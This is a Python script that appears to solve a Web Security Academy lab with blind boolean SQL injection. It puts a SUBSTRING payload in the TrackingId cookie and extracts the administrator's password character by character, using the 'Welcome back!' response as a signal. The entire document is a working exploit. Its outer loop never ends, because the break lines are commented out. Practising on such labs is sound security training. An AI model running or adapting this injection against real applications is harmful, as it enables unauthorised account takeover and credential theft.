import requests
import string
import sys

req = requests.Session()
url = "https://ac131f411edbea44c07f22ee00870099.web-security-academy.net"

#For debugging
proxy = dict(https='http://127.0.0.1:8080',http='http://127.0.0.1:8080')

#Match for
hit = "Welcome back!"

password = ""
index = 1

brute_words = string.ascii_letters + string.digits

while True:
    for i in brute_words:
        sys.stdout.write(f"\r[+] Password: {password}{i}")
        payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {index}, 1) = '{i}"
        post_cookies = dict(TrackingId=f'JUByS3qv4Bh3ukJs{payload}',session='A6DYswM4DwdypAQH92TnnJRPCskhHm8Y')
        r = requests.get(url , cookies= post_cookies)

        if hit in r.text:
            password += i
            index += 1

        #if index == 22:
        #    break
            
    #break

print("\n[+]Cracked:")
print(f"[+]Password is: {password}")        

#print(r.text)
